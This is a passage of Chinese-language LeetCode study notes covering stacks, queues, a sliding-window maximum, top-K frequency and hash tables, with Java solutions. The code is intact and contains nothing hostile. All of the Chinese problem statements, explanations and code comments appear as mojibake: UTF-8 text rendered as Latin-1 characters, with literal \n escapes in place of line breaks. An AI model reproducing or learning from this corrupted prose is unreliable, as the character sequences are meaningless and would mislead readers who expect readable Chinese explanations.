ç§»é™¤å¹¶è¿”å›æ ˆé¡¶å…ƒç´ ã€‚\n-   `int top()` è¿”å›æ ˆé¡¶å…ƒç´ ã€‚\n-   `boolean empty()` å¦‚æœæ ˆæ˜¯ç©ºçš„ï¼Œè¿”å› `true` ï¼›å¦åˆ™ï¼Œè¿”å› `false` ã€‚\n\n**æ³¨æ„ï¼š**\n\n-   ä½ åªèƒ½ä½¿ç”¨é˜Ÿåˆ—çš„åŸºæœ¬æ“ä½œ â€”â€” ä¹Ÿå°±æ˜¯ `push to back`ã€`peek/pop from front`ã€`size` å’Œ `is empty` è¿™äº›æ“ä½œã€‚\n-   ä½ æ‰€ä½¿ç”¨çš„è¯­è¨€ä¹Ÿè®¸ä¸æ”¯æŒé˜Ÿåˆ—ã€‚ ä½ å¯ä»¥ä½¿ç”¨ list ï¼ˆåˆ—è¡¨ï¼‰æˆ–è€… dequeï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰æ¥æ¨¡æ‹Ÿä¸€ä¸ªé˜Ÿåˆ— , åªè¦æ˜¯æ ‡å‡†çš„é˜Ÿåˆ—æ“ä½œå³å¯ã€‚\n\n**ç¤ºä¾‹ï¼š**\n\n```\nè¾“å…¥ï¼š\n[\"MyStack\", \"push\", \"push\", \"top\", \"pop\", \"empty\"]\n[[], [1], [2], [], [], []]\nè¾“å‡ºï¼š\n[null, null, null, 2, 2, false]\n\nè§£é‡Šï¼š\nMyStack myStack = new MyStack();\nmyStack.push(1);\nmyStack.push(2);\nmyStack.top(); // è¿”å› 2\nmyStack.pop(); // è¿”å› 2\nmyStack.empty(); // è¿”å› False\n```\n\n------\n\n```java\nclass MyStack {\n\n    Queue<Integer> queue1;\n    Queue<Integer> queue2;\n\n    public MyStack() {\n        queue1 = new LinkedList();   // å­˜å‚¨æ ˆå†…çš„å…ƒç´ ï¼Œ\n        queue2 = new LinkedList();   // å…¥æ ˆæ“ä½œçš„è¾…åŠ©é˜Ÿåˆ—\n    }\n    public void push(int x) {\n        queue2.offer(x); //å…ˆå­˜å…¥queue2\n        //æŠŠqueue1çš„ä¹Ÿå­˜å…¥queue2\n        while(!queue1.isEmpty()){\n            queue2.offer(queue1.poll());\n        }\n        //æœ€åäº¤æ¢queue1å’Œqueue2ï¼Œå°†å…ƒç´ éƒ½æ”¾åˆ°queue1ä¸­\n        Queue<Integer> temp = queue1;\n        queue1 = queue2;\n        queue2 = temp;\n    }\n    \n    public int pop() {\n        return queue1.poll();\n    }\n    \n    public int top() {\n        return queue1.peek();\n\n    }\n    //queue1ç”¨äºå­˜å‚¨æ ˆå†…çš„å…ƒç´ ï¼Œå› æ­¤åªéœ€è¦åˆ¤æ–­queue1æ˜¯å¦ä¸ºç©ºå³å¯\n    public boolean empty() {\n        return queue1.isEmpty();\n\n    }\n}\n```\n\n```java\n//ä¸€ä¸ªé˜Ÿåˆ—å®ç°æ ˆ\nclass MyStack {\n  \n    Queue<Integer> queue;\n\n    public MyStack() {\n        queue = new LinkedList<Integer>();\n    }\n    \n    //å…¥æ ˆæ“ä½œæ—¶ï¼Œé¦–å…ˆè·å¾—å…¥æ ˆå‰çš„å…ƒç´ ä¸ªæ•°nï¼Œç„¶åå°†å…ƒç´ å…¥é˜Ÿåˆ°é˜Ÿåˆ—ï¼Œå†å°†é˜Ÿåˆ—ä¸­çš„å‰ n ä¸ªå…ƒç´ ï¼ˆå³é™¤äº†æ–°å…¥æ ˆçš„å…ƒç´ ä¹‹å¤–çš„å…¨éƒ¨å…ƒç´ ï¼‰ä¾æ¬¡å‡ºé˜Ÿå¹¶å…¥é˜Ÿåˆ°é˜Ÿåˆ—ï¼Œæ­¤æ—¶é˜Ÿåˆ—çš„å‰ç«¯çš„å…ƒç´ å³ä¸ºæ–°å…¥æ ˆçš„å…ƒç´ ï¼Œä¸”é˜Ÿåˆ—çš„å‰ç«¯å’Œåç«¯åˆ†åˆ«å¯¹åº”æ ˆé¡¶å’Œæ ˆåº•ã€‚\n    public void push(int x) {\n        int n = queue.size();\n        queue.offer(x);\n        for (int i = 0; i < n; i++) {\n            queue.offer(queue.poll());\n        }\n    }\n    \n    public int pop() {\n        return queue.poll();\n    }\n    \n    public int top() {\n        return queue.peek();\n    }\n    \n    public boolean empty() {\n        return queue.isEmpty();\n    }\n}\n```\n\n#### [20. æœ‰æ•ˆçš„æ‹¬å·](https://leetcode.cn/problems/valid-parentheses/)\n\nç»™å®šä¸€ä¸ªåªåŒ…æ‹¬ `'('`ï¼Œ`')'`ï¼Œ`'{'`ï¼Œ`'}'`ï¼Œ`'['`ï¼Œ`']'` çš„å­—ç¬¦ä¸² `s` ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚\n\næœ‰æ•ˆå­—ç¬¦ä¸²éœ€æ»¡è¶³ï¼š\n\n1.  å·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚\n2.  å·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚\n3.  æ¯ä¸ªå³æ‹¬å·éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç›¸åŒç±»å‹çš„å·¦æ‹¬å·ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼šs = \"()\"\nè¾“å‡ºï¼štrue\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šs = \"()[]{}\"\nè¾“å‡ºï¼štrue\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šs = \"(]\"\nè¾“å‡ºï¼šfalse\n```\n\n------\n\n```java\nclass Solution {\n    public boolean isValid(String s) {\n        int n = s.length();\n        // å¦‚æœsçš„é•¿åº¦ä¸ºå¥‡æ•°ï¼Œä¸€å®šä¸ç¬¦åˆè¦æ±‚\n        if (n % 2 == 1) return false;\n        Map<Character, Character> map = new HashMap<Character, Character>() {{\n            put(')', '(');\n            put(']', '[');\n            put('}', '{');\n        }};\n        Deque<Character> stack = new LinkedList<>();\n        for(int i = 0; i < n; i++){\n            if(map.containsKey(s.charAt(i))){ //åæ‹¬å·åˆ™å°†å¯¹åº”å‰æ‹¬å·å‡ºæ ˆ\n                if (stack.isEmpty() || stack.peek() != map.get(s.charAt(i))) {\n                    return false;\n                }\n                stack.pop();\n            } else {\n                stack.push(s.charAt(i)); //å‰æ‹¬å·ç›´æ¥å…¥æ ˆ\n            }\n        }\n        return stack.isEmpty();\n    }\n}\n```\n\n#### [1047. åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç›¸é‚»é‡å¤é¡¹](https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/)\n\nç»™å‡ºç”±å°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸² `S`ï¼Œ**é‡å¤é¡¹åˆ é™¤æ“ä½œ**ä¼šé€‰æ‹©ä¸¤ä¸ªç›¸é‚»ä¸”ç›¸åŒçš„å­—æ¯ï¼Œå¹¶åˆ é™¤å®ƒä»¬ã€‚\n\nåœ¨ S ä¸Šåå¤æ‰§è¡Œé‡å¤é¡¹åˆ é™¤æ“ä½œï¼Œç›´åˆ°æ— æ³•ç»§ç»­åˆ é™¤ã€‚\n\nåœ¨å®Œæˆæ‰€æœ‰é‡å¤é¡¹åˆ é™¤æ“ä½œåè¿”å›æœ€ç»ˆçš„å­—ç¬¦ä¸²ã€‚ç­”æ¡ˆä¿è¯å”¯ä¸€ã€‚\n\n**ç¤ºä¾‹ï¼š**\n\n```\nè¾“å…¥ï¼š\"abbaca\"\nè¾“å‡ºï¼š\"ca\"\nè§£é‡Šï¼š\nä¾‹å¦‚ï¼Œåœ¨ \"abbaca\" ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ é™¤ \"bb\" ç”±äºä¸¤å­—æ¯ç›¸é‚»ä¸”ç›¸åŒï¼Œè¿™æ˜¯æ­¤æ—¶å”¯ä¸€å¯ä»¥æ‰§è¡Œåˆ é™¤æ“ä½œçš„é‡å¤é¡¹ã€‚ä¹‹åæˆ‘ä»¬å¾—åˆ°å­—ç¬¦ä¸² \"aaca\"ï¼Œå…¶ä¸­åˆåªæœ‰ \"aa\" å¯ä»¥æ‰§è¡Œé‡å¤é¡¹åˆ é™¤æ“ä½œï¼Œæ‰€ä»¥æœ€åçš„å­—ç¬¦ä¸²ä¸º \"ca\"ã€‚\n```\n\n------\n\n```java\n//æ ˆ\nclass Solution {\n    public String removeDuplicates(String s) {\n        Deque<Character> stack = new ArrayDeque<>();\n        for(char ch : s.toCharArray()){\n            if(stack.isEmpty() || stack.peek() != ch){\n                stack.push(ch);\n            } else{\n                stack.pop();\n            }\n        }\n        String str = \"\";\n        while(!stack.isEmpty()){\n            str =stack.pop() +str;\n        }\n        return str;\n    }\n}\n\n//æ•°ç»„\nclass Solution {\n    public String removeDuplicates(String s) {\n        char[] str = s.toCharArray();\n        int top = -1;\n        for (int i = 0; i < s.length(); i++) {\n            if (top == -1 || str[top] != str[i]) {\n                str[++top] = str[i];\n            } else {\n                top--;\n            }\n        }\n        return String.valueOf(str, 0, top + 1);\n    }\n}\n```\n\n#### [150. é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼](https://leetcode.cn/problems/evaluate-reverse-polish-notation/)\n\næ ¹æ® [é€†æ³¢å…°è¡¨ç¤ºæ³•](https://baike.baidu.com/item/%E9%80%86%E6%B3%A2%E5%85%B0%E5%BC%8F/128437)ï¼Œæ±‚è¡¨è¾¾å¼çš„å€¼ã€‚\n\næœ‰æ•ˆçš„ç®—ç¬¦åŒ…æ‹¬ `+`ã€`-`ã€`*`ã€`/` ã€‚æ¯ä¸ªè¿ç®—å¯¹è±¡å¯ä»¥æ˜¯æ•´æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ªé€†æ³¢å…°è¡¨è¾¾å¼ã€‚\n\n**æ³¨æ„** ä¸¤ä¸ªæ•´æ•°ä¹‹é—´çš„é™¤æ³•åªä¿ç•™æ•´æ•°éƒ¨åˆ†ã€‚\n\nå¯ä»¥ä¿è¯ç»™å®šçš„é€†æ³¢å…°è¡¨è¾¾å¼æ€»æ˜¯æœ‰æ•ˆçš„ã€‚æ¢å¥è¯è¯´ï¼Œè¡¨è¾¾å¼æ€»ä¼šå¾—å‡ºæœ‰æ•ˆæ•°å€¼ä¸”ä¸å­˜åœ¨é™¤æ•°ä¸º 0 çš„æƒ…å†µã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼štokens = [\"2\",\"1\",\"+\",\"3\",\"*\"]\nè¾“å‡ºï¼š9\nè§£é‡Šï¼šè¯¥ç®—å¼è½¬åŒ–ä¸ºå¸¸è§çš„ä¸­ç¼€ç®—æœ¯è¡¨è¾¾å¼ä¸ºï¼š((2 + 1) * 3) = 9\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼štokens = [\"4\",\"13\",\"5\",\"/\",\"+\"]\nè¾“å‡ºï¼š6\nè§£é‡Šï¼šè¯¥ç®—å¼è½¬åŒ–ä¸ºå¸¸è§çš„ä¸­ç¼€ç®—æœ¯è¡¨è¾¾å¼ä¸ºï¼š(4 + (13 / 5)) = 6\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼štokens = [\"10\",\"6\",\"9\",\"3\",\"+\",\"-11\",\"*\",\"/\",\"*\",\"17\",\"+\",\"5\",\"+\"]\nè¾“å‡ºï¼š22\nè§£é‡Šï¼šè¯¥ç®—å¼è½¬åŒ–ä¸ºå¸¸è§çš„ä¸­ç¼€ç®—æœ¯è¡¨è¾¾å¼ä¸ºï¼š\n  ((10 * (6 / ((9 + 3) * -11))) + 17) + 5\n= ((10 * (6 / (12 * -11))) + 17) + 5\n= ((10 * (6 / -132)) + 17) + 5\n= ((10 * 0) + 17) + 5\n= (0 + 17) + 5\n= 17 + 5\n= 22\n```\n\n------\n\n```java\nclass Solution {\n    public int evalRPN(String[] tokens) {\n        Deque<Integer> stack = new ArrayDeque<>();\n         for(String s : tokens){\n            if (\"+-*/\".contains(s)) {\n                int a = stack.pop();\n                int b = stack.pop();\n                if(\"+\".equals(s))  stack.push(a + b);\n                else if(\"-\".equals(s))  stack.push(b - a);\n                else if(\"*\".equals(s))  stack.push(a * b);\n                else if(\"/\".equals(s))  stack.push(b / a);\n            } else {\n                stack.push(Integer.valueOf(s));\n            }\n         }\n        return stack.pop();\n    }\n}\n\nclass Solution {\n    public int evalRPN(String[] tokens) {\n        Deque<Integer> stack = new ArrayDeque<>();\n         for(String s : tokens){\n            if (\"+-*/\".contains(s)) {\n                int a = stack.pop();\n                int b = stack.pop();\n                switch(s){\n                    case \"+\": \n                        stack.push(a + b);\n                        break;\n                    case \"-\": \n                        stack.push(b - a);\n                        break;\n                    case \"*\": \n                        stack.push(a * b);\n                        break;\n                    case \"/\": \n                        stack.push(b / a);\n                        break;\n                }\n            } else {\n                stack.push(Integer.valueOf(s));\n            }\n         }\n        return stack.pop();\n    }\n}\n```\n\n#### [239. æ»‘åŠ¨çª—å£æœ€å¤§å€¼](https://leetcode.cn/problems/sliding-window-maximum/)\n\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums`ï¼Œæœ‰ä¸€ä¸ªå¤§å°ä¸º `k` çš„æ»‘åŠ¨çª—å£ä»æ•°ç»„çš„æœ€å·¦ä¾§ç§»åŠ¨åˆ°æ•°ç»„çš„æœ€å³ä¾§ã€‚ä½ åªå¯ä»¥çœ‹åˆ°åœ¨æ»‘åŠ¨çª—å£å†…çš„ `k` ä¸ªæ•°å­—ã€‚æ»‘åŠ¨çª—å£æ¯æ¬¡åªå‘å³ç§»åŠ¨ä¸€ä½ã€‚è¿”å› *æ»‘åŠ¨çª—å£ä¸­çš„æœ€å¤§å€¼* ã€‚ \n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [1,3,-1,-3,5,3,6,7], k = 3\nè¾“å‡ºï¼š[3,3,5,5,6,7]\nè§£é‡Šï¼š\næ»‘åŠ¨çª—å£çš„ä½ç½®                æœ€å¤§å€¼\n---------------               -----\n[1  3  -1] -3  5  3  6  7       3\n 1 [3  -1  -3] 5  3  6  7       3\n 1  3 [-1  -3  5] 3  6  7       5\n 1  3  -1 [-3  5  3] 6  7       5\n 1  3  -1  -3 [5  3  6] 7       6\n 1  3  -1  -3  5 [3  6  7]      7\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [1], k = 1\nè¾“å‡ºï¼š[1]\n```\n\n------\n\n**æ–¹æ³•ä¸€ï¼šä¼˜å…ˆé˜Ÿåˆ—**\n\nåˆå§‹æ—¶ï¼Œæˆ‘ä»¬å°†æ•°ç»„ nums çš„å‰ k ä¸ªå…ƒç´ å’Œå¯¹åº”åæ ‡æ”¾å…¥ä¼˜å…ˆé˜Ÿåˆ—ä¸­ã€‚\n\næ¯å½“å‘å³ç§»åŠ¨çª—å£æ—¶ï¼Œå°±æŠŠæ–°çš„å…ƒç´ æ”¾å…¥ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œæ­¤æ—¶å †é¡¶çš„å…ƒç´ å°±æ˜¯å †ä¸­æ‰€æœ‰å…ƒç´ çš„æœ€å¤§å€¼ã€‚\n\nç‰¹æ®Šæƒ…å†µï¼šåˆ°ç›®å‰æ¯æ¬¡æ»‘å‡ºçª—å£çš„å…ƒç´ å¹¶æ²¡æœ‰éƒ½ä»å †ä¸­åˆ é™¤ï¼Œå°±ä¼šé€ æˆå‰é¢çª—å£çš„æœ€å¤§å€¼ä¸€ç›´åœ¨ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œè€Œçª—å£å·²ç»ç§»èµ°ï¼Œæœ€å¤§å€¼å·²ç»æ›´æ¢ï¼Œå‰é¢çª—å£çš„æœ€å¤§å€¼åº”è¯¥ç§»å‡ºé˜Ÿåˆ—\n\n```java\nclass Solution {\n    public int[] maxSlidingWindow(int[] nums, int k) {\n        int n = nums.length;\n        // 1. ä¼˜å…ˆé˜Ÿåˆ—å­˜æ”¾çš„æ˜¯äºŒå…ƒç»„(num,index) \n        // num :   æ˜¯ä¸ºäº†æ¯”è¾ƒå…ƒç´ å¤§å°\n        // index : æ˜¯ä¸ºäº†åˆ¤æ–­çª—å£çš„å¤§å°æ˜¯å¦è¶…å‡ºèŒƒå›´\n        PriorityQueue<int[]> pq = new PriorityQueue<int[]>(new Comparator<int[]>(){\n            public int compare(int[] pair1,int[] pair2){\n                //å¤§é¡¶å †ï¼ˆå…ƒç´ å¤§å°ä¸åŒæŒ‰å…ƒç´ å¤§å°æ’åˆ—ï¼Œå…ƒç´ å¤§å°ç›¸åŒæŒ‰ä¸‹æ ‡è¿›è¡Œæ’åˆ—ï¼‰\n                return pair1[0] != pair2[0] ? pair2[0] - pair1[0]:pair2[1] - pair1[1];\n            }\n        });\n\n        // 2. ä¼˜å…ˆé˜Ÿåˆ—åˆå§‹åŒ– : kä¸ªå…ƒç´ çš„å †\n        for(int i = 0;i < k;i++){\n            pq.offer(new int[]{nums[i], i});\n        }\n\n        // 3. å¤„ç†å †é€»è¾‘\n        int[] res = new int[n - k + 1];            // åˆå§‹åŒ–ç»“æœæ•°ç»„é•¿åº¦ ï¼šä¸€å…±æœ‰ n - k + 1ä¸ªçª—å£\n        res[0] = pq.peek()[0];                    // åˆå§‹åŒ–res[0] ï¼š æ‹¿å‡ºç›®å‰å †é¡¶çš„å…ƒç´ \n        for(int i = k; i < n; i++){               // å‘å³ç§»åŠ¨æ»‘åŠ¨çª—å£\n            pq.offer(new int[]{nums[i],i});      // åŠ å…¥å¤§é¡¶å †ä¸­\n            //ç‰¹æ®Šæƒ…å†µ å½“æ ˆé¡¶å…ƒç´ ä¸åœ¨å½“å‰çª—å£èŒƒå›´å°±ç§»é™¤\n            while(pq.peek()[1] <= i - k){       // å°†æ ˆé¡¶ä¸‹æ ‡ä¸åœ¨æ»‘åŠ¨çª—å£ä¸­å°±å¹²æ‰\n                pq.poll();                      // ç»´æŠ¤ï¼šå †çš„å¤§å°å°±æ˜¯æ»‘åŠ¨çª—å£çš„å¤§å°\n            }   \n            res[i - k + 1] = pq.peek()[0];      // æ­¤æ—¶å †é¡¶å…ƒç´ å°±æ˜¯æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼\n        }\n        return res;\n    }\n}\n```\n\n**æ–¹æ³•äºŒï¼šå•è°ƒé˜Ÿåˆ—**\n\n```java\nclass Solution {\n    public int[] maxSlidingWindow(int[] nums, int k) {\n        if(nums == null || nums.length < 2){\n            return nums;\n        }\n        // ç»´æŠ¤ä¸€ä¸ªå•è°ƒé€’å‡çš„åŒç«¯é˜Ÿåˆ—ï¼Œå­˜å…ƒç´ åæ ‡(æ–¹ä¾¿åˆ¤æ–­é˜Ÿé¦–çš„å€¼æ˜¯å¦åœ¨çª—å£èŒƒå›´)\n        Deque<Integer> deque = new LinkedList<>();\n        // å­˜å‚¨æœ€åè¿”å›ç»“æœ\n        int[] res = new int[nums.length - k + 1];\n\n        for(int i = 0; i < nums.length; i++){\n            // æ¸…ç†ä¸åœ¨çª—å£èŒƒå›´çš„å…ƒç´ \n            if(!deque.isEmpty() && deque.peek() <= i - k){\n                deque.pollFirst();\n            }\n            // åˆ é™¤æ‰€æœ‰æ¯”æ–°å…¥é˜Ÿå…ƒç´ å°çš„æ—§å…ƒç´ \n            while(!deque.isEmpty() && nums[deque.peekLast()] <= nums[i]){\n                deque.pollLast();\n            }\n            // æ–°å…ƒç´ å…¥é˜Ÿ\n            deque.addLast(i);\n            // å½“çª—å£é•¿åº¦ä¸ºkæ—¶ å¼€å§‹ä¿å­˜çª—å£ä¸­æœ€å¤§å€¼\n            if(i + 1 >= k){\n                res[i + 1 - k] = nums[deque.peekFirst()];\n            }\n        }\n        return res;\n    }\n}\n```\n\n\n\n#### [347. å‰ K ä¸ªé«˜é¢‘å…ƒç´ ](https://leetcode.cn/problems/top-k-frequent-elements/)\n\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums` å’Œä¸€ä¸ªæ•´æ•° `k` ï¼Œè¯·ä½ è¿”å›å…¶ä¸­å‡ºç°é¢‘ç‡å‰ `k` é«˜çš„å…ƒç´ ã€‚ä½ å¯ä»¥æŒ‰ **ä»»æ„é¡ºåº** è¿”å›ç­”æ¡ˆã€‚\n\n**ç¤ºä¾‹ 1:**\n\n```\nè¾“å…¥: nums = [1,1,1,2,2,3], k = 2\nè¾“å‡º: [1,2]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```\nè¾“å…¥: nums = [1], k = 1\nè¾“å‡º: [1]\n```\n\n------\n\n```java\nclass Solution {\n    public int[] topKFrequent(int[] nums, int k) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int i : nums){\n            map.put(i, map.getOrDefault(i, 0) + 1);\n        }\n\n        // int[] çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä»£è¡¨æ•°ç»„çš„å€¼ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä»£è¡¨äº†è¯¥å€¼å‡ºç°çš„æ¬¡æ•°\n         // é˜Ÿåˆ—æŒ‰ç…§é”®å€¼å¯¹ä¸­çš„å€¼ï¼ˆå…ƒç´ å‡ºç°é¢‘ç‡ï¼‰ä»å°åˆ°å¤§æ’åº\n        PriorityQueue<int[]> queue = new PriorityQueue<int[]>(new Comparator<int[]>() {\n            public int compare(int[] m, int[] n) {\n                return m[1] - n[1];\n            }\n        });\n        // éå†mapï¼Œç”¨æœ€å°å †ä¿å­˜é¢‘ç‡æœ€å¤§çš„kä¸ªå…ƒç´ \n        for (Map.Entry<Integer, Integer> entry : map.entrySet()) {\n            int num = entry.getKey(), count = entry.getValue();\n            if (queue.size() == k) {\n                if (queue.peek()[1] < count) {\n                    queue.poll();\n                    queue.offer(new int[]{num, count});\n                }\n            } else {\n                queue.offer(new int[]{num, count});\n            }\n        }\n        \n        int[] ret = new int[k];\n        for (int i = 0; i < k; ++i) {\n            ret[i] = queue.poll()[0];\n        }\n        return ret;\n    }\n}\n\n\nclass Solution {\n    public int[] topKFrequent(int[] nums, int k) {\n        // ç»Ÿè®¡æ¯ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œå…ƒç´ ä¸ºé”®ï¼Œå…ƒç´ å‡ºç°çš„æ¬¡æ•°ä¸ºå€¼\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int i : nums){\n            map.put(i, map.getOrDefault(i, 0) + 1);\n        }\n\n         // é˜Ÿåˆ—æŒ‰ç…§é”®å€¼å¯¹ä¸­çš„å€¼ï¼ˆå…ƒç´ å‡ºç°é¢‘ç‡ï¼‰ä»å°åˆ°å¤§æ’åº\n        PriorityQueue<Integer> queue = new PriorityQueue<>(new Comparator<Integer>() {\n            @Override\n            public int compare(Integer a, Integer b) {\n                return map.get(a) - map.get(b);\n            }\n        });\n        // éå†mapï¼Œç”¨æœ€å°å †ä¿å­˜é¢‘ç‡æœ€å¤§çš„kä¸ªå…ƒç´ \n        for(Integer key : map.keySet()){\n            if (queue.size() < k) {\n                queue.offer(key);\n            } else if (map.get(key) > map.get(queue.peek())) {\n                queue.poll();\n                queue.offer(key);\n            }\n        }\n\n        int[] ret = new int[k];\n        for (int i = 0; i < k; ++i) {\n            ret[i] = queue.poll();\n        }\n        return ret;\n    }\n}\n```\n\n\n\n## â‘£å“ˆå¸Œè¡¨\n\n### â¶åŸºç¡€çŸ¥è¯†\n\nå“ˆå¸Œè¡¨(Hash table)ï¼Œæ˜¯æ ¹æ®**å…³é”®ç å€¼**(Key value)è€Œç›´æ¥è¿›è¡Œè®¿é—®çš„æ•°æ®ç»“æ„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒé€šè¿‡æŠŠå…³é”®ç å€¼æ˜ å°„åˆ°è¡¨ä¸­ä¸€ä¸ªä½ç½®æ¥è®¿é—®è®°å½•ï¼Œä»¥åŠ å¿«æŸ¥æ‰¾çš„é€Ÿåº¦ã€‚è¿™ä¸ªæ˜ å°„å‡½æ•°å«åšæ•£åˆ—å‡½æ•°ï¼Œå­˜æ”¾è®°å½•çš„æ•°ç»„å«åšå“ˆå¸Œè¡¨ã€‚\n\nå¸¸è§çš„ä¸‰ç§å“ˆå¸Œç»“æ„\n\n- æ•°ç»„\n\n```java\nint[] hashTable = new int[26]; //å­˜26å­—æ¯ç´¢å¼•\n\n//hashTable[s.charAt(i) - 'a']++; å­—æ¯å­˜åœ¨åˆ™åœ¨å¯¹åº”ä½ç½®åŠ 1\n```\n\n- set ï¼ˆé›†åˆï¼‰\n\n```java\nSet<Integer> set = new HashSet<>();\n\n//set.add(num) æ’å…¥å…ƒç´ \n//set.contains(num) æŸ¥æ‰¾é”®æ˜¯å¦å­˜åœ¨\n```\n\n- mapï¼ˆæ˜ å°„ï¼‰\n\n```java\nMap<Integer, Integer> map = new HashMap<>();\n\n//map.put(key,value) æ’å…¥å…ƒç´ \n//map.getOrDefault(ch, 0); æŸ¥è¯¢mapæ˜¯å¦å­˜åœ¨ch,ä¸å­˜åœ¨è®¾ç½®é»˜è®¤å€¼0\n//map.values()  è¿”å›æ‰€æœ‰value\n//map.containsKey(key) æŸ¥æ‰¾é”®æ˜¯å¦å­˜åœ¨\n//map.isEmpty() åˆ¤æ–­æ˜¯å¦ä¸ºç©º\n//map.get() æ ¹æ®é”®è·å–å€¼\n//map.remove() æ ¹æ®é”®åˆ é™¤æ˜ å°„å…³ç³»\n```\n\n### â·LeetCodeçœŸé¢˜\n\n#### [242. æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯](https://leetcode.cn/problems/valid-anagram/)\n\nç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² `_s_` å’Œ `_t_` ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­ `_t_` æ˜¯å¦æ˜¯ `_s_` çš„å­—æ¯å¼‚ä½è¯ã€‚\n\n**æ³¨æ„ï¼š**è‹¥ `_s_` å’Œ `_t_` ä¸­æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°éƒ½ç›¸åŒï¼Œåˆ™ç§° `_s_` å’Œ `_t_` äº’ä¸ºå­—æ¯å¼‚ä½è¯ã€‚\n\n**ç¤ºä¾‹ 1:**\n\n```\nè¾“å…¥: s = \"anagram\", t = \"nagaram\"\nè¾“å‡º: true\n```\n\n**ç¤ºä¾‹ 2:**\n\n```\nè¾“å…¥: s = \"rat\", t = \"car\"\nè¾“å‡º: false\n```\n\n------\n\n**æ–¹æ³•1ï¼šå“ˆå¸Œè¡¨**\n\n- é¦–å…ˆåˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ç›¸ç­‰ï¼Œä¸ç›¸ç­‰åˆ™ç›´æ¥è¿”å› false\n\n- è‹¥ç›¸ç­‰ï¼Œåˆ™åˆå§‹åŒ– 26 ä¸ªå­—æ¯å“ˆå¸Œè¡¨ï¼Œéå†å­—ç¬¦ä¸² s å’Œ t\n- s è´Ÿè´£åœ¨å¯¹åº”ä½ç½®å¢åŠ ï¼Œt è´Ÿè´£åœ¨å¯¹åº”ä½ç½®å‡å°‘\n- å¦‚æœå“ˆå¸Œè¡¨çš„å€¼éƒ½ä¸º 0ï¼Œåˆ™äºŒè€…æ˜¯å­—æ¯å¼‚ä½è¯\n\n```java\n//O(n)\nclass Solution {\n    public boolean isAnagram(String s, String t) {\n        if(s.length() != t.length()){\n            return false;\n        }\n        int[] hashTable = new int[26];\n        for(int i = 0; i < s.length(); i++){\n            hashTable[s.charAt(i) - 'a']++;\n            hashTable[t.charAt(i) - 'a']--;\n        }\n        for(int i = 0; i < 26; i++){\n            if(hashTable[i] != 0) \n                return false;\n        }\n        return true;\n    }\n}\n```\n\n**æ–¹æ³•2ï¼šæ’åº**\nt æ˜¯ s çš„å¼‚ä½è¯ç­‰ä»·äºã€Œä¸¤ä¸ªå­—ç¬¦ä¸²æ’åºåç›¸ç­‰ã€ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¯¹å­—ç¬¦ä¸² s å’Œ t åˆ†åˆ«æ’åºï¼Œçœ‹æ’åºåçš„å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰å³å¯åˆ¤æ–­ã€‚æ­¤å¤–ï¼Œå¦‚æœ s å’Œ t çš„é•¿åº¦ä¸åŒï¼Œt å¿…ç„¶ä¸æ˜¯ s çš„å¼‚ä½è¯ã€‚\n\n```java\n//O(nlogâ¡n)\nclass Solution {\n    public boolean isAnagram(String s, String t) {\n        if (s.length() != t.length()) {\n            return false;\n        }\n        char[] str1 = s.toCharArray();\n        char[] str2 = t.toCharArray();\n        Arrays.sort(str1);\n        Arrays.sort(str2);\n        return Arrays.equals(str1, str2);\n    }\n}\n```\n\n#### [49. å­—æ¯å¼‚ä½è¯åˆ†ç»„ ](https://leetcode.cn/problems/group-anagrams/)\n\nç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œè¯·ä½ å°† **å­—æ¯å¼‚ä½è¯** ç»„åˆåœ¨ä¸€èµ·ã€‚å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç»“æœåˆ—è¡¨ã€‚\n\n**å­—æ¯å¼‚ä½è¯** 